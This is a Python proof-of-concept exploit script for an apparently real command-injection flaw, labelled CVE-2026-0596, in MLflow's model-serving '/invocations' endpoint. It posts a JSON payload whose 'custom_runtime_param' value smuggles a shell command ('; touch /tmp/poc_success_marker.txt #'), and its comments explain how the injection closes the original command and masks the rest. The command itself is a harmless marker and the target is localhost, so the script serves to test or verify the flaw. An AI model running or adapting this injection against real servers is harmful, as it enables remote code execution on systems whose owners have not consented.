import requests
import json

# The endpoint where our vulnerable MLflow model-serving utility is hosted
TARGET_URL = "http://localhost:5000/invocations"

def trigger_vulnerability():
    print("[*] Preparing validation payload for CVE-2026-0596...")
    
    # This structure mirrors how MLflow expects incoming parameters for model execution.
    payload = {
        "dataframe_split": {
            "columns": ["machine_input"],
            "data": [["test_data"]]
        },
        "params": {
            # The Exploit String injection vector:
            # We append a semicolon to close out the original command string boundary,
            # followed by our system-level test command, and a comment character '#' to mask the rest.
            "custom_runtime_param": "default_runtime; touch /tmp/poc_success_marker.txt #"
        }
    }
    
    headers = {
        "Content-Type": "application/json"
    }

    try:
        print(f"[*] Sending query to server targeting execution wrapper...")
        response = requests.post(TARGET_URL, data=json.dumps(payload), headers=headers, timeout=10)
        
        # Even if the server returns an internal error or a prediction failure, 
        # the underlying shell instruction may have executed beforehand!
        print(f"[+] Server responded with HTTP status code: {response.status_code}")
        print("[*] Query cycle completed. Checking container for verification...")
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Communication error encountered: {e}")

if __name__ == "__main__":
    trigger_vulnerability()